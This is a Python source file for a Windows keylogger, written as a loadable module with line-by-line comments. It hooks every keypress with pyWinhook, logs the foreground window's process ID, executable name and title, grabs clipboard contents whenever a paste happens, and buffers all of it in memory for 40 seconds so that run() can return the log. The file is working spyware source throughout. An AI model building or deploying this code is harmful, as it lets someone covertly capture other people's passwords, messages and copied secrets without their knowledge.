from ctypes import byref, create_string_buffer,  c_ulong, windll # Used for interacting with Windows API
from io import StringIO # File-like object for capturing standard output in memory.

import os # Interact with the OS
import pythoncom # Package that provides Component Object Model (COM) support. Used for message pumping. 
import pyWinhook as pyHook # Library for hooking keyboard events in Windows.
import sys # Provides access to command-line arguments and system functions.
import time # Used for controlling time like delaying commands being runned.
import win32clipboard # Used to access the system clipboard.

TIMESTART = time.time() # Setting the start time to determine how long the module has been running.
TIMEOUT = 40 # Defines the length of how long the program will run (time is in seconds).

# Creating a class for the keylogger functions.
class KeyLogger:
    # Initialization of a variable.
    def __init__(self):
        self.current_window = None # This variable is used to track the current active window.
    
    # Retrieves information about the current foreground process (The active window)
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow() # Returns a handle to the active window.
        pid = c_ulong(0) # Storing the process ID.
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # Retrieves the process ID from the active window.
        process_id = f'{pid.value}'
        
        # Opens the processes with specified permissions.
        executable = create_string_buffer(512) # Create a string buffer and assign it to a variable.
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) # Opening the process.
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # Saving the executable name to the variable.
        
        # Retrieves the title of the active window.
        window_title = create_string_buffer(512) # Create a string buffer and assign it to a variable.
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # Retrieve the window title.
        # Used to print out an error occuring when the title contains a non-ASCII character.
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        
        # Print out the title and process id 
        print('\n', process_id, executable.value.decode(), self.current_window)

        # Closes the handles used to get the title and process id.
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # Called whenever a key is pressed.
    def mykeystroke(self, event):
        # Checks if the current window has been changed with compairing the two below.
        if event.WindowName != self.current_window:
            self.get_current_process()
        # Checks if the key that was pressed is one of the ascii numbers 33-126. Prints the character out.
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # Prints out the results from a paste command.
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            # Prints out if a key modifier like CTRL, ALT, SHIFT, etc was pressed.
            else:
                print(f'{event.Key}')  
        return True

# Function that is running the keylogger.
def run():
    # Redirecting the logs of keystokes from stdout to StringIO().
    save_stdout = sys.stdout
    sys.stdout = StringIO() # StringIO is an in-memory string buffer.

    kl = KeyLogger() # Assigning a function to a variable.
    hm = pyHook.HookManager() # When 
    hm.KeyDown = kl.mykeystroke # Binding a key press event to the Keylogger class to record the key that was presed.
    hm.HookKeyboard() # Instructing PyWInHook to hook all keypresses.
    # Loop to continue hooking keypresses until the TIMEOUT has been reached.
    while time.time()-TIMESTART < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        
    log = sys.stdout.getvalue() # Saving the log of key presses to a varible.
    sys.stdout = save_stdout # Restoring stdout back to how it was origionally.
    return log # Returning the saved log of keypresses.

'''
Below is not needed while being runned as a module.

# Checks if the script is being run directly to start its execution.    
if __name__ == '__main__':
    print(run()) # Calls run() and prints out the log it will get from 'return log'.
    print('done.')
'''
